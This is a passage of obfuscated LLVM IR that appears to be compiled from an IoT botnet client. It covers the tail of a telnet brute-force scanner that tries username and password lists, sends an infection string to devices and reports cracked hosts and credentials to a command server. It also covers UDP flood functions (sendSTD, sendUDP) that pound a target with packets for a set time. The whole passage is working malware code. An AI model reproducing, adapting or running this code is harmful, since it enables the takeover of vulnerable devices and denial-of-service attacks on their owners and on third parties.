  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %701, i32 0, i32 0
  %703 = load i32, i32* %702, align 16
  %704 = call i64 @send(i32 %703, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.317, i32 0, i32 0), i64 8, i32 16384)
  %705 = icmp slt i64 %704, 0
  br i1 %705, label %706, label %721

; <label>:706:                                    ; preds = %698
  %707 = load i32, i32* %5, align 4
  %708 = sext i32 %707 to i64
  %709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %708
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %709, i32 0, i32 0
  %711 = load i32, i32* %710, align 16
  %712 = call i32 @sclose(i32 %711)
  %713 = load i32, i32* %5, align 4
  %714 = sext i32 %713 to i64
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %714
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %715, i32 0, i32 2
  store i8 0, i8* %716, align 8
  %717 = load i32, i32* %5, align 4
  %718 = sext i32 %717 to i64
  %719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %718
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %719, i32 0, i32 3
  store i8 1, i8* %720, align 1
  br label %911

; <label>:721:                                    ; preds = %698
  %722 = load i32, i32* %5, align 4
  %723 = sext i32 %722 to i64
  %724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %723
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %724, i32 0, i32 0
  %726 = load i32, i32* %725, align 16
  %727 = call i64 @send(i32 %726, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.318, i32 0, i32 0), i64 7, i32 16384)
  %728 = icmp slt i64 %727, 0
  br i1 %728, label %729, label %744

; <label>:729:                                    ; preds = %721
  %730 = load i32, i32* %5, align 4
  %731 = sext i32 %730 to i64
  %732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %731
  %733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %732, i32 0, i32 0
  %734 = load i32, i32* %733, align 16
  %735 = call i32 @sclose(i32 %734)
  %736 = load i32, i32* %5, align 4
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %737
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %738, i32 0, i32 2
  store i8 0, i8* %739, align 8
  %740 = load i32, i32* %5, align 4
  %741 = sext i32 %740 to i64
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %741
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %742, i32 0, i32 3
  store i8 1, i8* %743, align 1
  br label %911

; <label>:744:                                    ; preds = %721
  %745 = load i32, i32* %5, align 4
  %746 = sext i32 %745 to i64
  %747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %746
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %747, i32 0, i32 0
  %749 = load i32, i32* %748, align 16
  %750 = call i64 @send(i32 %749, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.319, i32 0, i32 0), i64 4, i32 16384)
  %751 = icmp slt i64 %750, 0
  br i1 %751, label %752, label %767

; <label>:752:                                    ; preds = %744
  %753 = load i32, i32* %5, align 4
  %754 = sext i32 %753 to i64
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %754
  %756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %755, i32 0, i32 0
  %757 = load i32, i32* %756, align 16
  %758 = call i32 @sclose(i32 %757)
  %759 = load i32, i32* %5, align 4
  %760 = sext i32 %759 to i64
  %761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %760
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %761, i32 0, i32 2
  store i8 0, i8* %762, align 8
  %763 = load i32, i32* %5, align 4
  %764 = sext i32 %763 to i64
  %765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %764
  %766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %765, i32 0, i32 3
  store i8 1, i8* %766, align 1
  br label %911

; <label>:767:                                    ; preds = %744
  %768 = load i32, i32* %5, align 4
  %769 = sext i32 %768 to i64
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %769
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %770, i32 0, i32 0
  %772 = load i32, i32* %771, align 16
  %773 = call i64 @send(i32 %772, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.320, i32 0, i32 0), i64 26, i32 16384)
  %774 = icmp slt i64 %773, 0
  br i1 %774, label %775, label %790

; <label>:775:                                    ; preds = %767
  %776 = load i32, i32* %5, align 4
  %777 = sext i32 %776 to i64
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %777
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %778, i32 0, i32 0
  %780 = load i32, i32* %779, align 16
  %781 = call i32 @sclose(i32 %780)
  %782 = load i32, i32* %5, align 4
  %783 = sext i32 %782 to i64
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %783
  %785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %784, i32 0, i32 2
  store i8 0, i8* %785, align 8
  %786 = load i32, i32* %5, align 4
  %787 = sext i32 %786 to i64
  %788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %787
  %789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %788, i32 0, i32 3
  store i8 1, i8* %789, align 1
  br label %911

; <label>:790:                                    ; preds = %767
  %791 = load i32, i32* %5, align 4
  %792 = sext i32 %791 to i64
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %792
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %793, i32 0, i32 0
  %795 = load i32, i32* %794, align 16
  %796 = load i32, i32* %3, align 4
  %797 = load i32, i32* %5, align 4
  %798 = sext i32 %797 to i64
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %798
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %799, i32 0, i32 9
  %801 = load i8*, i8** %800, align 8
  %802 = call i32 @read_until_response(i32 %795, i32 %796, i8* %801, i32 1024, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @legit, i32 0, i32 0))
  %803 = icmp ne i32 %802, 0
  br i1 %803, label %804, label %909

; <label>:804:                                    ; preds = %790
  %805 = load i32, i32* %5, align 4
  %806 = sext i32 %805 to i64
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %806
  %808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %807, i32 0, i32 0
  %809 = load i32, i32* %808, align 16
  %810 = load i8*, i8** @rekdevice, align 8
  %811 = load i8*, i8** @rekdevice, align 8
  %812 = call i64 @strlen(i8* %811) #10
  %813 = call i64 @send(i32 %809, i8* %810, i64 %812, i32 16384)
  %814 = icmp sgt i64 %813, 0
  br i1 %814, label %815, label %819

; <label>:815:                                    ; preds = %804
  %816 = load i32, i32* %5, align 4
  %817 = sext i32 %816 to i64
  %818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %817
  call void @reset_telstate(%struct.telstate_t* %818)
  br label %819

; <label>:819:                                    ; preds = %815, %804
  %820 = call i32 @sleep(i32 20)
  %821 = load i32, i32* %5, align 4
  %822 = sext i32 %821 to i64
  %823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %822
  %824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %823, i32 0, i32 0
  %825 = load i32, i32* %824, align 16
  %826 = load i32, i32* %3, align 4
  %827 = load i32, i32* %5, align 4
  %828 = sext i32 %827 to i64
  %829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %828
  %830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %829, i32 0, i32 9
  %831 = load i8*, i8** %830, align 8
  %832 = call i32 @read_until_response(i32 %825, i32 %826, i8* %831, i32 1024, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @infected, i32 0, i32 0))
  %833 = icmp ne i32 %832, 0
  br i1 %833, label %834, label %860

; <label>:834:                                    ; preds = %819
  %835 = load i32, i32* @mainCommSock, align 4
  %836 = load i32, i32* %5, align 4
  %837 = sext i32 %836 to i64
  %838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %837
  %839 = call i8* @get_telstate_host(%struct.telstate_t* %838)
  %840 = load i32, i32* %5, align 4
  %841 = sext i32 %840 to i64
  %842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %841
  %843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %842, i32 0, i32 4
  %844 = load i8, i8* %843, align 2
  %845 = zext i8 %844 to i64
  %846 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %845
  %847 = load i8*, i8** %846, align 8
  %848 = load i32, i32* %5, align 4
  %849 = sext i32 %848 to i64
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %849
  %851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %850, i32 0, i32 5
  %852 = load i8, i8* %851, align 1
  %853 = zext i8 %852 to i64
  %854 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %853
  %855 = load i8*, i8** %854, align 8
  %856 = call i32 (i32, i8*, ...) @sockprintf(i32 %835, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.321, i32 0, i32 0), i8* %839, i8* %847, i8* %855)
  %857 = load i32, i32* %5, align 4
  %858 = sext i32 %857 to i64
  %859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %858
  call void @reset_telstate(%struct.telstate_t* %859)
  br label %911

; <label>:860:                                    ; preds = %819
  %861 = load i32, i32* %5, align 4
  %862 = sext i32 %861 to i64
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %862
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %863, i32 0, i32 7
  %865 = load i32, i32* %864, align 16
  %866 = sub i32 %865, 1503739571
  %867 = add i32 %866, 60
  %868 = add i32 %867, 1503739571
  %869 = add i32 %865, 60
  %870 = zext i32 %868 to i64
  %871 = call i64 @time(i64* null) #2
  %872 = icmp slt i64 %870, %871
  br i1 %872, label %873, label %908

; <label>:873:                                    ; preds = %860
  %874 = load i32, i32* %5, align 4
  %875 = sext i32 %874 to i64
  %876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %875
  %877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %876, i32 0, i32 3
  %878 = load i8, i8* %877, align 1
  %879 = zext i8 %878 to i32
  %880 = icmp ne i32 %879, 3
  br i1 %880, label %881, label %904

; <label>:881:                                    ; preds = %873
  %882 = load i32, i32* @mainCommSock, align 4
  %883 = load i32, i32* %5, align 4
  %884 = sext i32 %883 to i64
  %885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %884
  %886 = call i8* @get_telstate_host(%struct.telstate_t* %885)
  %887 = load i32, i32* %5, align 4
  %888 = sext i32 %887 to i64
  %889 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %888
  %890 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %889, i32 0, i32 4
  %891 = load i8, i8* %890, align 2
  %892 = zext i8 %891 to i64
  %893 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %892
  %894 = load i8*, i8** %893, align 8
  %895 = load i32, i32* %5, align 4
  %896 = sext i32 %895 to i64
  %897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %896
  %898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %897, i32 0, i32 5
  %899 = load i8, i8* %898, align 1
  %900 = zext i8 %899 to i64
  %901 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %900
  %902 = load i8*, i8** %901, align 8
  %903 = call i32 (i32, i8*, ...) @sockprintf(i32 %882, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.322, i32 0, i32 0), i8* %886, i8* %894, i8* %902)
  br label %904

; <label>:904:                                    ; preds = %881, %873
  %905 = load i32, i32* %5, align 4
  %906 = sext i32 %905 to i64
  %907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i64 %906
  call void @reset_telstate(%struct.telstate_t* %907)
  br label %908

; <label>:908:                                    ; preds = %904, %860
  br label %909

; <label>:909:                                    ; preds = %908, %790
  br label %910

; <label>:910:                                    ; preds = %909, %668, %561, %519, %467, %425, %376, %265, %100
  br label %911

; <label>:911:                                    ; preds = %910, %834, %775, %752, %729, %706, %683, %649, %557, %545, %501, %463, %451, %407, %354, %350, %212, %181, %168
  %912 = load i32, i32* %5, align 4
  %913 = add i32 %912, 1441867979
  %914 = add i32 %913, 1
  %915 = sub i32 %914, 1441867979
  %916 = add nsw i32 %912, 1
  store i32 %915, i32* %5, align 4
  br label %82

; <label>:917:                                    ; preds = %82
  br label %80
}

; Function Attrs: nounwind
declare i64 @time(i64*) #4

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.hostent*, align 8
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i64, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca [12 x i8], align 1
  %18 = alloca [78 x i8*], align 16
  %19 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %11, align 4
  %20 = call i64 @time(i64* null) #2
  store i64 %20, i64* %14, align 8
  %21 = call noalias i8* @malloc(i64 1024) #2
  store i8* %21, i8** %16, align 8
  %22 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 1024, i32 1, i1 false)
  %23 = getelementptr inbounds [12 x i8], [12 x i8]* %17, i32 0, i32 0
  %24 = load i32, i32* %5, align 4
  %25 = call i32 (i8*, i8*, ...) @sprintf(i8* %23, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.323, i32 0, i32 0), i32 %24) #2
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %17, i32 0, i32 0
  %27 = call i32 @strcmp(i8* %26, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.324, i32 0, i32 0)) #10
  %28 = icmp ne i32 %27, 0
  br i1 %28, label %30, label %29

; <label>:29:                                     ; preds = %3
  store i32 1, i32* %11, align 4
  br label %30

; <label>:30:                                     ; preds = %29, %3
  %31 = bitcast [78 x i8*]* %18 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %31, i8* bitcast ([78 x i8*]* @sendSTD.randstrings to i8*), i64 624, i32 16, i1 false)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %32, align 4
  %33 = load i32, i32* @mainCommSock, align 4
  %34 = load i8*, i8** %4, align 8
  %35 = getelementptr inbounds [12 x i8], [12 x i8]* %17, i32 0, i32 0
  %36 = call i32 (i32, i8*, ...) @sockprintf(i32 %33, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.402, i32 0, i32 0), i8* %34, i8* %35)
  br label %37

; <label>:37:                                     ; preds = %91, %30
  %38 = load i32, i32* %11, align 4
  %39 = icmp eq i32 %38, 1
  br i1 %39, label %40, label %50

; <label>:40:                                     ; preds = %37
  %41 = call i32 @rand() #2
  %42 = srem i32 %41, 65535
  %43 = add i32 %42, 1090940566
  %44 = add i32 %43, 1026
  %45 = sub i32 %44, 1090940566
  %46 = add nsw i32 %42, 1026
  %47 = trunc i32 %45 to i16
  %48 = call zeroext i16 @htons(i16 zeroext %47) #13
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %48, i16* %49, align 2
  br label %55

; <label>:50:                                     ; preds = %37
  %51 = load i32, i32* %5, align 4
  %52 = trunc i32 %51 to i16
  %53 = call zeroext i16 @htons(i16 zeroext %52) #13
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %53, i16* %54, align 2
  br label %55

; <label>:55:                                     ; preds = %50, %40
  %56 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %56, i32* %7, align 4
  %57 = icmp slt i32 %56, 0
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %55
  br label %76

; <label>:59:                                     ; preds = %55
  %60 = call i32 @rand() #2
  %61 = sext i32 %60 to i64
  %62 = urem i64 %61, 78
  %63 = getelementptr inbounds [78 x i8*], [78 x i8*]* %18, i64 0, i64 %62
  %64 = load i8*, i8** %63, align 8
  store i8* %64, i8** %16, align 8
  %65 = load i32, i32* %7, align 4
  %66 = load i8*, i8** %16, align 8
  %67 = load i8*, i8** %16, align 8
  %68 = call i64 @strlen(i8* %67) #10
  %69 = bitcast %union.__CONST_SOCKADDR_ARG* %19 to %struct.sockaddr**
  %70 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  store %struct.sockaddr* %70, %struct.sockaddr** %69, align 8
  %71 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %19, i32 0, i32 0
  %72 = load %struct.sockaddr*, %struct.sockaddr** %71, align 8
  %73 = call i64 @sendto(i32 %65, i8* %66, i64 %68, i32 0, %struct.sockaddr* %72, i32 16)
  %74 = load i32, i32* %7, align 4
  %75 = call i32 @close(i32 %74)
  br label %76

; <label>:76:                                     ; preds = %59, %58
  %77 = load i32, i32* %8, align 4
  %78 = icmp sge i32 %77, 100
  br i1 %78, label %79, label %91

; <label>:79:                                     ; preds = %76
  %80 = call i64 @time(i64* null) #2
  %81 = load i64, i64* %14, align 8
  %82 = load i32, i32* %6, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 0, %83
  %85 = sub i64 %81, %84
  %86 = add nsw i64 %81, %83
  %87 = icmp sge i64 %80, %85
  br i1 %87, label %88, label %89

; <label>:88:                                     ; preds = %79
  br label %97

; <label>:89:                                     ; preds = %79
  store i32 0, i32* %8, align 4
  br label %90

; <label>:90:                                     ; preds = %89
  br label %91

; <label>:91:                                     ; preds = %90, %76
  %92 = load i32, i32* %8, align 4
  %93 = add i32 %92, 1458262848
  %94 = add i32 %93, 1
  %95 = sub i32 %94, 1458262848
  %96 = add nsw i32 %92, 1
  store i32 %95, i32* %8, align 4
  br label %37

; <label>:97:                                     ; preds = %88
  %98 = load i32, i32* %7, align 4
  %99 = call i32 @close(i32 %98)
  call void @exit(i32 0) #14
  unreachable
                                                  ; No predecessors!
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.udphdr*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load i32, i32* %10, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %43

; <label>:39:                                     ; preds = %8
  %40 = call i32 @rand_cmwc()
  %41 = trunc i32 %40 to i16
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %41, i16* %42, align 2
  br label %48

; <label>:43:                                     ; preds = %8
  %44 = load i32, i32* %10, align 4
  %45 = trunc i32 %44 to i16
  %46 = call zeroext i16 @htons(i16 zeroext %45) #13
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %46, i16* %47, align 2
  br label %48

; <label>:48:                                     ; preds = %43, %39
  %49 = load i8*, i8** %9, align 8
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %51 = call i32 @getHost(i8* %49, %struct.in_addr* %50)
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %54

; <label>:53:                                     ; preds = %48
  br label %364

; <label>:54:                                     ; preds = %48
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %56 = getelementptr inbounds [8 x i8], [8 x i8]* %55, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 8, i32 4, i1 false)
  %57 = load i32, i32* %14, align 4
  store i32 %57, i32* %18, align 4
  %58 = load i32, i32* %12, align 4
  %59 = icmp eq i32 %58, 32
  br i1 %59, label %60, label %142

; <label>:60:                                     ; preds = %54
  %61 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %61, i32* %19, align 4
  %62 = load i32, i32* %19, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %67, label %64

; <label>:64:                                     ; preds = %60
  %65 = load i32, i32* @mainCommSock, align 4
  %66 = call i32 (i32, i8*, ...) @sockprintf(i32 %65, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.403, i32 0, i32 0))
  br label %364

; <label>:67:                                     ; preds = %60
  %68 = load i32, i32* %13, align 4
  %69 = sub i32 0, 1
  %70 = sub i32 %68, %69
  %71 = add nsw i32 %68, 1
  %72 = sext i32 %70 to i64
  %73 = call noalias i8* @malloc(i64 %72) #2
  store i8* %73, i8** %20, align 8
  %74 = load i8*, i8** %20, align 8
  %75 = icmp eq i8* %74, null
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %67
  br label %364

; <label>:77:                                     ; preds = %67
  %78 = load i8*, i8** %20, align 8
  %79 = load i32, i32* %13, align 4
  %80 = sub i32 0, %79
  %81 = sub i32 0, 1
  %82 = add i32 %80, %81
  %83 = sub i32 0, %82
  %84 = add nsw i32 %79, 1
  %85 = sext i32 %83 to i64
  call void @llvm.memset.p0i8.i64(i8* %78, i8 0, i64 %85, i32 1, i1 false)
  %86 = load i8*, i8** %20, align 8
  %87 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %86, i32 %87)
  %88 = call i64 @time(i64* null) #2
  %89 = load i32, i32* %11, align 4
  %90 = sext i32 %89 to i64
  %91 = sub i64 0, %90
  %92 = sub i64 %88, %91
  %93 = add nsw i64 %88, %90
  %94 = trunc i64 %92 to i32
  store i32 %94, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %95

; <label>:95:                                     ; preds = %135, %131, %121, %77
  %96 = load i32, i32* %19, align 4
  %97 = load i8*, i8** %20, align 8
  %98 = load i32, i32* %13, align 4
  %99 = sext i32 %98 to i64
  %100 = bitcast %union.__CONST_SOCKADDR_ARG* %24 to %struct.sockaddr**
  %101 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %101, %struct.sockaddr** %100, align 8
  %102 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %24, i32 0, i32 0
  %103 = load %struct.sockaddr*, %struct.sockaddr** %102, align 8
  %104 = call i64 @sendto(i32 %96, i8* %97, i64 %99, i32 0, %struct.sockaddr* %103, i32 16)
  %105 = load i32, i32* %22, align 4
  %106 = load i32, i32* %18, align 4
  %107 = icmp eq i32 %105, %106
  br i1 %107, label %108, label %122

; <label>:108:                                    ; preds = %95
  %109 = load i32, i32* %10, align 4
  %110 = icmp eq i32 %109, 0
  br i1 %110, label %111, label %115

; <label>:111:                                    ; preds = %108
  %112 = call i32 @rand_cmwc()
  %113 = trunc i32 %112 to i16
  %114 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %113, i16* %114, align 2
  br label %115

; <label>:115:                                    ; preds = %111, %108
  %116 = call i64 @time(i64* null) #2
  %117 = load i32, i32* %21, align 4
  %118 = sext i32 %117 to i64
  %119 = icmp sgt i64 %116, %118
  br i1 %119, label %120, label %121

; <label>:120:                                    ; preds = %115
  br label %141

; <label>:121:                                    ; preds = %115
  store i32 0, i32* %22, align 4
  br label %95

; <label>:122:                                    ; preds = %95
  %123 = load i32, i32* %22, align 4
  %124 = sub i32 %123, 1177156893
  %125 = add i32 %124, 1
  %126 = add i32 %125, 1177156893
  %127 = add i32 %123, 1
  store i32 %126, i32* %22, align 4
  %128 = load i32, i32* %23, align 4
  %129 = load i32, i32* %15, align 4
  %130 = icmp eq i32 %128, %129
  br i1 %130, label %131, label %135

; <label>:131:                                    ; preds = %122
  %132 = load i32, i32* %16, align 4
  %133 = mul nsw i32 %132, 1000
  %134 = call i32 @usleep(i32 %133)
  store i32 0, i32* %23, align 4
  br label %95

; <label>:135:                                    ; preds = %122
  %136 = load i32, i32* %23, align 4
  %137 = add i32 %136, -837384040
  %138 = add i32 %137, 1
  %139 = sub i32 %138, -837384040
  %140 = add i32 %136, 1
  store i32 %139, i32* %23, align 4
  br label %95

; <label>:141:                                    ; preds = %120
  br label %364

; <label>:142:                                    ; preds = %54
  %143 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %143, i32* %25, align 4
  %144 = load i32, i32* %25, align 4
  %145 = icmp ne i32 %144, 0
  br i1 %145, label %149, label %146

; <label>:146:                                    ; preds = %142
  %147 = load i32, i32* @mainCommSock, align 4
  %148 = call i32 (i32, i8*, ...) @sockprintf(i32 %147, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.403, i32 0, i32 0))
  br label %364

; <label>:149:                                    ; preds = %142
  store i32 1, i32* %26, align 4
  %150 = load i32, i32* %25, align 4
  %151 = bitcast i32* %26 to i8*
  %152 = call i32 @setsockopt(i32 %150, i32 0, i32 3, i8* %151, i32 4) #2
  %153 = icmp slt i32 %152, 0
  br i1 %153, label %154, label %157

; <label>:154:                                    ; preds = %149
  %155 = load i32, i32* @mainCommSock, align 4
  %156 = call i32 (i32, i8*, ...) @sockprintf(i32 %155, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.404, i32 0, i32 0))
  br label %364

; <label>:157:                                    ; preds = %149
  store i32 50, i32* %27, align 4
  br label %158

; <label>:158:                                    ; preds = %164, %157
  %159 = load i32, i32* %27, align 4
  %160 = sub i32 0, -1
  %161 = sub i32 %159, %160
  %162 = add nsw i32 %159, -1
  store i32 %161, i32* %27, align 4
  %163 = icmp ne i32 %159, 0
  br i1 %163, label %164, label %176

; <label>:164:                                    ; preds = %158
  %165 = call i64 @time(i64* null) #2
  %166 = call i32 @rand_cmwc()
  %167 = zext i32 %166 to i64
  %168 = xor i64 %165, -1
  %169 = and i64 %167, %168
  %170 = xor i64 %167, -1
  %171 = and i64 %165, %170
  %172 = or i64 %169, %171
  %173 = xor i64 %165, %167
  %174 = trunc i64 %172 to i32
  call void @srand(i32 %174) #2
  %175 = call i32 @rand() #2
  call void @init_rand(i32 %175)
  br label %158

; <label>:176:                                    ; preds = %158
  %177 = load i32, i32* %12, align 4
  %178 = icmp eq i32 %177, 0
  br i1 %178, label %179, label %180

; <label>:179:                                    ; preds = %176
  store i32 0, i32* %28, align 4
  br label %200

; <label>:180:                                    ; preds = %176
  %181 = load i32, i32* %12, align 4
  %182 = sub i32 0, %181
  %183 = add i32 32, %182
  %184 = sub nsw i32 32, %181
  %185 = shl i32 1, %183
  %186 = sub i32 0, 1
  %187 = add i32 %185, %186
  %188 = sub nsw i32 %185, 1
  %189 = xor i32 %187, -1
  %190 = and i32 1326709022, %189
  %191 = xor i32 1326709022, -1
  %192 = and i32 %187, %191
  %193 = xor i32 -1, -1
  %194 = and i32 %193, 1326709022
  %195 = and i32 -1, %191
  %196 = or i32 %190, %192
  %197 = or i32 %194, %195
  %198 = xor i32 %196, %197
  %199 = xor i32 %187, -1
